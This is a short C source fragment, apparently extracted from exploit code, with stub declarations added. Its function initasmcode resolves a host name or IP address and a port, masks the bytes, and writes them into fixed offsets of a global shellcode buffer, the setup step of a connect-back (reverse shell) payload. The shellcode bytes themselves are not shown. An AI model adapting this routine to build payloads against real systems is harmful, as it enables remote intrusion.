
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct hostent {char* h_addr; } ;
typedef char port ;
typedef int name ;


 size_t AMSK ;
 size_t AOFF ;
 size_t PMSK ;
 size_t POFF ;
 int exit (int) ;
 int findvalmask (char*,char*,int) ;
 struct hostent* gethostbyname (char*) ;
 int gethostname (char*,int) ;
 int inet_addr (char*) ;
 int memcpy (int*,char*,int) ;
 int printf (char*) ;
 int putaddr (char*,int ) ;
 int rev (int) ;
 int* shellcode ;
 int strcpy (char*,char*) ;

void initasmcode(char *addr,int port) {
 char abuf[4],amask[4],pbuf[2],pmask[2];
 char name[256];
 struct hostent *hp;
 int i;

 if (!addr) gethostname(name,sizeof(name));
  else strcpy(name,addr);

 if ((i=inet_addr(name))==-1) {
  if ((hp=gethostbyname(name))==((void*)0)) {
   printf("error: address\n");exit(-1);
  }
  memcpy(&i,hp->h_addr,4);
 }

 putaddr(abuf,rev(i));

 pbuf[0]=(port>>8)&0xff;
 pbuf[1]=(port)&0xff;

 findvalmask(abuf,amask,4);
 findvalmask(pbuf,pmask,2);

 memcpy(&shellcode[AOFF],abuf,4);
 memcpy(&shellcode[AMSK],amask,4);
 memcpy(&shellcode[POFF],pbuf,2);
 memcpy(&shellcode[PMSK],pmask,2);
}
